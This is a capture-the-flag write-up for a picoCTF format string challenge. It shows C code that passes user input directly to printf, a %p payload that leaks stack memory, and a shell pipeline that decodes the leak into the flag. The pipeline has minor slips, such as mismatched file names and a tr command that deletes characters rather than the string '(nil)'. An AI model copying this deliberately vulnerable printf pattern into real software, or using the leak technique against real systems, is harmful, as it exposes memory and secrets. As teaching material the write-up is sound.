# URL
https://play.picoctf.org/practice/challenge/434?category=6&page=2
# Concept
* format string vulnerability
# Source Code
```C
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```
# Method of solve
* the program is vulnerable to `format string injection` vulnerability due to user input being passed directly as an argument to the `printf` function
```C
scanf("%1024s", buf);   // user controls buf contents
printf(buf);            // user-controlled string is used as printf's *format string*
```
* so we can pass in `%p` strings to leak out pointers in program memory
* so we can pass in this format string injection payload to get values from the memory stack:
```
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
```
* this seems like a lot, and most of these values are in hexadecimal format
* we'll take this output, and turn it into a file, `raw_input.txt`
* then from there, we'll clean up the output and get the ASCII values from the hex values:
```Bash
cat raw_output.txt | tr -d '(nil)' | sed -E 's/0x[0-9a-fA-F],//g' | sed -E 's/0x//g' | tr -d ',' | sed 's/../& /g' | tac -s ' ' | tr -d ' \n' | xxd -r -p | strings
```
* we can breakdown what this command does:
```
cat raw_output.txt             # read the file
tr -d '(nil)'                  # remove the nil values
sed -E 's/0x[0-9a-fA-F],//g'   # remove all instances of single-character hex values
sed -E 's/0x//g'               # remove all 0x prefixes on hex strings
tr -d ','                      # remove all commas
sed 's/../& /g'                # separate the string into two-character chunks
tac -s ' '                     # reverse the output, using spaces as a delimiter
tr -d ' \n                     # remove all spaces and newlines
xxd -r -p                      # convert hexadecimal to ASCII characters
strings                        # retrieve printable characters
```
